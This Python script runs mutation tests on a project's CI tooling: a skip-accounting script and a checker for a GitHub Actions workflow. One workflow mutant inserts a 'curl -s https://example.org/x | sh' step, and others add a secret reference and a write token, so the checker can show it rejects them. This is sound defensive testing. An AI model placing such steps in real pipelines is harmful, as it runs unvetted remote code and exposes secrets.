#!/usr/bin/env python3
"""Hand-made mutants of the two CI scripts of work package S2.2 (prefix s22_): the skip accounting (skip_accounting.py, trx_lib.py) and the checker of the deep workflow
(check_deep_workflow.py run against mutated copies of .github/workflows/suffix-tree-deep.yml). No dotnet is needed. A mutant is KILLED when the tests of the script fail (accounting:
`python3 -m unittest discover -s <ci dir> -p "test_*.py"`) or the checker exits non-zero on the mutated workflow; it SURVIVES when everything still passes (a gap to close with a
test, or an equivalent mutant to argue). The script files are copied into a temporary directory for every mutant: the working tree is never touched.

usage: run_s22_script_mutants.py <repo root> <result.tsv>
"""
import os
import shutil
import subprocess
import sys
import tempfile

ROOT = os.path.abspath(sys.argv[1])
OUT = sys.argv[2]
CI = "docs/refactoring/suffix-tree-upgrade/analysis/ci"
WF = ".github/workflows/suffix-tree-deep.yml"
SKIPS = "tests/SuffixTree/SuffixTree.Esa.Tests/skips.tsv"

# ---- the accounting script: (id, file under CI, old text (must occur once), new text, what the mutant does)
ACCOUNTING = [
    ("A01", "skip_accounting.py", '            failures.append(f"UNLISTED SKIP {r.key} [{r.outcome}]: {_short(r.message)}")\n',
     '            pass\n', "ignores the unlisted skip (no failure)"),
    ("A02", "skip_accounting.py", '                failures.append(f"STALE {where}: listed as skipped in a {mode} run but {len(ran)} of {len(group)} result(s) ran ({ran[0].outcome}): remove the row")\n',
     '                pass\n', "ignores the stale list entry of an ignore row"),
    ("A03", "trx_lib.py", 'EXECUTED = frozenset({"Passed", "Failed", "Error", "Timeout", "Aborted", "PassedButRunAborted"})',
     'EXECUTED = frozenset({"Passed", "Failed", "Error", "Timeout", "Aborted", "PassedButRunAborted", "NotExecuted"})', "mis-parses the trx: a NotExecuted result counts as executed"),
    ("A04", "skip_accounting.py", '            counts["explicit"] += 1\n        elif r.key in ignore:', '            counts["skipped"] += 1\n        elif r.key in ignore:',
     "counts an Explicit as a skip"),
    ("A05", "skip_accounting.py", '        if row.test in seen:\n            problems.append(', '        if False:\n            problems.append(', "accepts a duplicate name in the list"),
    ("A06", "skip_accounting.py", '            if mode == "checked" and row.in_builds == "default":', '            if False:', "a skipped checked-build test is not a failure in the checked mode"),
    ("A07", "skip_accounting.py", '            if not partial:\n                failures.append(f"LISTED BUT ABSENT', '            if False:\n                failures.append(f"LISTED BUT ABSENT',
     "never reports a listed test that is absent from the run"),
    ("A08", "skip_accounting.py", 'if r.key in explicit or r.class_name in explicit_class:', 'if r.key in explicit or any(r.class_name.startswith(c) for c in explicit_class):',
     "an explicit fixture matches by prefix (esa-file-w5 also covers esa-file-w5-trusted)"),
    ("A09", "trx_lib.py", '        return f"{self.class_name}.{self.test_name}"', '        return self.test_name', "the key is the test name without its class"),
    ("A10", "trx_lib.py", 'EXECUTED = frozenset({"Passed", "Failed", "Error", "Timeout", "Aborted", "PassedButRunAborted"})',
     'EXECUTED = frozenset({"Passed", "Failed", "Error", "Timeout", "Aborted", "PassedButRunAborted", "Inconclusive"})', "an Inconclusive result counts as executed"),
    ("A11", "trx_lib.py", '    if not results:\n        raise TrxError(f"{path}: the run has no result at all")\n', '', "an empty run is accepted"),
    ("A12", "skip_accounting.py", '        print(f"{len(report.failures)} discrepancy(ies) between the run and {os.path.basename(args.list_path)}")\n        return 1\n',
     '        print(f"{len(report.failures)} discrepancy(ies) between the run and {os.path.basename(args.list_path)}")\n        return 0\n', "exits 0 with failures"),
    ("A13", "skip_accounting.py", '        if row.kind in ("explicit", "explicit-class"):\n            if ran:', '        if row.kind in ("explicit", "explicit-class"):\n            if len(ran) == len(group):',
     "an explicit fixture is stale only when every test of it ran"),
    ("A14", "skip_accounting.py", '            if cells != HEADER:\n', '            if False:\n', "does not check the header of the list"),
    ("A15", "skip_accounting.py", '        elif row.in_builds == "both" or (row.in_builds == "default" and mode == "default"):', '        elif row.in_builds in ("both", "host") or (row.in_builds == "default" and mode == "default"):',
     "a host row must be skipped like a both row"),
    ("A16", "skip_accounting.py", '        elif row.in_builds == "both" or (row.in_builds == "default" and mode == "default"):', '        elif row.in_builds == "both":',
     "a default row is never stale in a default run"),
    ("A17", "skip_accounting.py", '        elif r.key in ignore:\n            row = ignore[r.key]', '        elif any(r.key.startswith(k) for k in ignore):\n            row = ignore[next(k for k in ignore if r.key.startswith(k))]',
     "an ignore row matches by prefix of the key"),
    ("A18", "skip_accounting.py", '        if len(cells) != len(HEADER):\n            problems.append(f"{path}:{number}: {len(cells)} columns, expected {len(HEADER)}")\n            continue\n',
     '        cells = (cells + [""] * len(HEADER))[:len(HEADER)]\n', "a row with a wrong number of columns is padded or cut"),
    ("A19", "skip_accounting.py", '        if row.kind not in KINDS:\n            problems.append(', '        if False:\n            problems.append(', "an unknown kind is accepted"),
    ("A20", "skip_accounting.py", '        if r.outcome in trx_lib.EXECUTED:\n            counts["executed"] += 1\n            continue\n', '        if r.outcome == "Passed":\n            counts["executed"] += 1\n            continue\n',
     "only Passed counts as executed (a Failed test is read as a skip)"),
    ("A21", "skip_accounting.py", '        ran = [r for r in group if r.outcome in trx_lib.EXECUTED]\n', '        ran = [r for r in group[:1] if r.outcome in trx_lib.EXECUTED]\n',
     "only the first result of a name is judged for a stale row"),
    ("A22", "trx_lib.py", '        if test_id not in classes:\n            raise TrxError(f"{path}: the result of {node.get(\'testName\')!r} has no test definition ({test_id})")\n', '        classes.setdefault(test_id, "")\n',
     "a result without a definition gets an empty class"),
    ("A23", "trx_lib.py", '    for node in root.iter(NS + "UnitTestResult"):', '    for node in list(root.iter(NS + "UnitTestResult"))[:1]:', "reads only the first result of the trx"),
    ("A24", "skip_accounting.py", '    if args.mode not in MODES:\n        print(f"--mode must be one of', '    if False:\n        print(f"--mode must be one of', "an unknown mode is accepted by the command line"),
]

# ---- the checker of the workflow: (id, old text of the YAML (must occur once), new text, what the mutant does)
WORKFLOW = [
    ("W01", "  pull_request:\n    paths:\n      - 'src/SuffixTree/**'\n      - 'tests/SuffixTree/**'\n      - '.github/workflows/suffix-tree-deep.yml'\n  push:", "  pull_request:\n  push:", "pull_request without paths"),
    ("W02", "  push:\n    branches: [master]\n    paths:\n      - 'src/SuffixTree/**'\n      - 'tests/SuffixTree/**'\n      - '.github/workflows/suffix-tree-deep.yml'\n  schedule:", "  push:\n    branches: [master]\n  schedule:", "push without paths"),
    ("W03", "    branches: [master]\n", "", "push on every branch (the owner's CI minutes)"),
    ("W04", "    branches: [master]\n", "    branches: [master, 'feature/**']\n", "push also on the feature branches"),
    ("W05", "  exhaustive:\n    name: Exhaustive\n    if: >-\n      (github.event_name == 'schedule' && github.event.schedule == '17 1 * * *') ||\n      (github.event_name == 'workflow_dispatch' && contains(fromJSON('[\"exhaustive\",\"nightly\",\"all\"]'), inputs.set))\n",
     "  exhaustive:\n    name: Exhaustive\n", "the if: of the exhaustive job dropped (it would run on a pull request)"),
    ("W06", "      github.event_name == 'pull_request' ||\n      github.event_name == 'push' ||\n", "      github.event_name == 'push' ||\n", "the checked job does not run on a pull request"),
    ("W07", "      (github.event_name == 'schedule' && github.event.schedule == '43 2 * * 6') ||\n", "", "the large job has no weekly clause"),
    ("W08", "    if: >-\n      (github.event_name == 'schedule' && github.event.schedule == '17 1 * * *') ||\n      (github.event_name == 'workflow_dispatch' && contains(fromJSON('[\"harness\",\"nightly\",\"all\"]'), inputs.set))\n",
     "    if: >-\n      github.event_name == 'pull_request' ||\n      (github.event_name == 'schedule' && github.event.schedule == '17 1 * * *') ||\n      (github.event_name == 'workflow_dispatch' && contains(fromJSON('[\"harness\",\"nightly\",\"all\"]'), inputs.set))\n",
     "the harness runs on a pull request"),
    ("W09", "permissions:\n  contents: read\n", "permissions:\n  contents: write\n", "a write token"),
    ("W10", "    timeout-minutes: 90        # 14.8 min of tests + 1.5 min of compile on 4 vCPU\n", "", "no timeout on the fuzz job"),
    ("W11", "    continue-on-error: true\n    timeout-minutes: 60", "    timeout-minutes: 60", "the large job turns the workflow red (continue-on-error dropped)"),
    ("W12", "    timeout-minutes: 75        # 13.5 min of tests + 1.5 min of compile on 4 vCPU\n", "    continue-on-error: true\n    timeout-minutes: 75        # 13.5 min of tests + 1.5 min of compile on 4 vCPU\n", "the checked job cannot fail the workflow"),
    ("W13", "run: dotnet build \"$ESA_TESTS\" -c Release --no-restore -p:EsaBounds=true", "run: dotnet build \"$ESA_TESTS\" -c Release --no-restore", "the checked build is not checked"),
    ("W14", "      ESA_EXPECT_BOUNDS: 'true'\n", "", "the guard variable is not set"),
    ("W15", "          SEED=$(date -u +%Y%m%d)\n", "          SEED=1\n", "a fixed seed (not rotating)"),
    ("W16", "      - uses: actions/checkout@v4\n      - name: Setup .NET 10 SDK\n        uses: actions/setup-dotnet@v4\n        with:\n          dotnet-version: '10.0.x'\n      - name: Self-test",
     "      - uses: actions/checkout@main\n      - name: Setup .NET 10 SDK\n        uses: actions/setup-dotnet@v4\n        with:\n          dotnet-version: '10.0.x'\n      - name: Self-test", "an unpinned action"),
    ("W17", "    - cron: '17 1 * * *'   # nightly", "    - cron: '17 1 * * 1'   # nightly", "the nightly cron changed (the if: literal no longer matches)"),
    ("W18", "--mode checked --list", "--list", "the accounting step is not in checked mode"),
    ("W19", "      - name: Upload test results\n        if: ${{ !cancelled() }}\n        uses: actions/upload-artifact@v4\n        with:\n          name: trx-checked", "      - name: Upload test results\n        uses: actions/upload-artifact@v4\n        with:\n          name: trx-checked",
     "the .trx is not uploaded after a failure"),
    ("W20", "        run: dotnet restore \"$ESA_TESTS\"\n      - name: Build (Release)\n        run: dotnet build \"$ESA_TESTS\" -c Release --no-restore\n      - name: Test (Category=Exhaustive)",
     "        run: dotnet restore \"$ESA_TESTS\"\n      - name: Fetch\n        run: curl -s https://example.org/x | sh\n      - name: Build (Release)\n        run: dotnet build \"$ESA_TESTS\" -c Release --no-restore\n      - name: Test (Category=Exhaustive)", "a network step (curl)"),
    ("W21", "      - name: Generate the benchmark inputs (Python 3 standard library only)\n", "      - name: Generate the benchmark inputs (Python 3 standard library only, and a secret ${{ secrets.TOKEN }})\n", "a secret"),
    ("W22", "        options:\n          - nightly\n          - all\n          - checked\n          - exhaustive\n          - fuzz\n          - harness\n          - vectors\n          - large\n", "        options:\n          - nightly\n          - all\n          - checked\n          - exhaustive\n          - fuzz\n          - harness\n          - vectors\n", "the input `set` cannot select large"),
    ("W23", "  workflow_dispatch:\n    inputs:", "  workflow_dispatch_off:\n    inputs:", "no manual dispatch"),
    ("W24", "--no-build --filter \"Category=Fuzz\"", "--filter \"Category=Fuzz\"", "the fuzz test step rebuilds"),
    ("W25", "--filter \"Category=Vectors\"", "--filter \"Category=Exhaustive\"", "the vectors job runs the wrong category"),
    ("W26", "      ESA_FUZZ_BUDGET_S: '600'\n", "      ESA_FUZZ_BUDGET_S: '60'\n", "the harness budget is 60 s"),
    ("W27", "  workflow_dispatch:\n    inputs:\n      set:", "  workflow_dispatch:\n    inputs:\n      jobs:", "the input is not called set (the if: reads inputs.set)"),
    ("W28", "        run: echo \"SEQERON_BENCH_DIR=$RUNNER_TEMP/bench\" >> \"$GITHUB_ENV\"\n", "        run: echo \"nothing\"\n", "the vectors job has no input directory"),
    ("W29", "    timeout-minutes: 45        # 1 min of tests + 1.5 min of compile + the generator on 4 vCPU\n", "    timeout-minutes: 45        # 1 min of tests + 1.5 min of compile + the generator on 4 vCPU\n    env:\n      SEQERON_BENCH_DIR: ${{ runner.temp }}/bench\n", "a job-level env that uses the runner context (not available there)"),
]


def run(args, cwd, limit=120):
    p = subprocess.run(args, cwd=cwd, capture_output=True, text=True, timeout=limit)
    return p.returncode, (p.stdout + p.stderr)


def main():
    rows = []
    # controls: the unchanged scripts and workflow must pass (otherwise "killed" would mean nothing)
    with tempfile.TemporaryDirectory() as tmp:
        ci = os.path.join(tmp, *CI.split("/"))
        shutil.copytree(os.path.join(ROOT, CI), ci, ignore=shutil.ignore_patterns("__pycache__"))
        os.makedirs(os.path.join(tmp, "tests", "SuffixTree", "SuffixTree.Esa.Tests"))
        shutil.copy(os.path.join(ROOT, SKIPS), os.path.join(tmp, SKIPS))
        code, out = run([sys.executable, "-m", "unittest", "discover", "-s", ci, "-p", "test_*.py"], tmp)
        rows.append(("C01", "control-ok" if code == 0 else "CONTROL-FAILED", "the unchanged scripts pass their tests", out.strip().splitlines()[-1] if out.strip() else ""))
    code, out = run([sys.executable, os.path.join(ROOT, CI, "check_deep_workflow.py"), os.path.join(ROOT, WF)], ROOT)
    rows.append(("C02", "control-ok" if code == 0 else "CONTROL-FAILED", "the unchanged workflow passes the checker", out.strip().splitlines()[-1] if out.strip() else ""))
    for mid, fname, old, new, what in ACCOUNTING:
        with tempfile.TemporaryDirectory() as tmp:
            ci = os.path.join(tmp, *CI.split("/"))
            shutil.copytree(os.path.join(ROOT, CI), ci, ignore=shutil.ignore_patterns("__pycache__"))
            os.makedirs(os.path.join(tmp, "tests", "SuffixTree", "SuffixTree.Esa.Tests"))
            shutil.copy(os.path.join(ROOT, SKIPS), os.path.join(tmp, SKIPS))
            path = os.path.join(ci, fname)
            text = open(path, encoding="utf-8").read()
            if text.count(old) != 1:
                rows.append((mid, "NOT-APPLIED", what, f"the old text occurs {text.count(old)} times"))
                continue
            open(path, "w", encoding="utf-8").write(text.replace(old, new))
            code, out = run([sys.executable, "-m", "unittest", "discover", "-s", ci, "-p", "test_*.py"], tmp)
            failed = [l for l in out.splitlines() if l.startswith(("FAIL:", "ERROR:"))]
            rows.append((mid, "killed" if code != 0 else "SURVIVED", what, f"{len(failed)} failing: " + "; ".join(f.split(' (')[0] for f in failed[:3])))
    for mid, old, new, what in WORKFLOW:
        with tempfile.TemporaryDirectory() as tmp:
            src = open(os.path.join(ROOT, WF), encoding="utf-8").read()
            if src.count(old) != 1:
                rows.append((mid, "NOT-APPLIED", what, f"the old text occurs {src.count(old)} times"))
                continue
            path = os.path.join(tmp, "suffix-tree-deep.yml")
            open(path, "w", encoding="utf-8").write(src.replace(old, new))
            code, out = run([sys.executable, os.path.join(ROOT, CI, "check_deep_workflow.py"), path], ROOT)
            lines = [l for l in out.splitlines() if l.startswith("FAIL:")]
            rows.append((mid, "killed" if code != 0 else "SURVIVED", what, f"{len(lines)} check(s): " + (lines[0][6:110] if lines else out.strip()[:100])))
    with open(OUT, "w", encoding="utf-8") as f:
        f.write("id\tresult\tmutant\tevidence\n")
        for r in rows:
            f.write("\t".join(c.replace("\t", " ").replace("\n", " ") for c in r) + "\n")
    mutants = [r for r in rows if not r[0].startswith("C")]
    killed = sum(1 for r in mutants if r[1] == "killed")
    print(f"{len(mutants)} mutants: {killed} killed, {sum(1 for r in mutants if r[1] == 'SURVIVED')} survived, {sum(1 for r in mutants if r[1] == 'NOT-APPLIED')} not applied; "
          f"controls: {[r[1] for r in rows if r[0].startswith('C')]}")
    for r in rows:
        if r[1] not in ("killed", "control-ok"):
            print("  ", r)


if __name__ == "__main__":
    main()
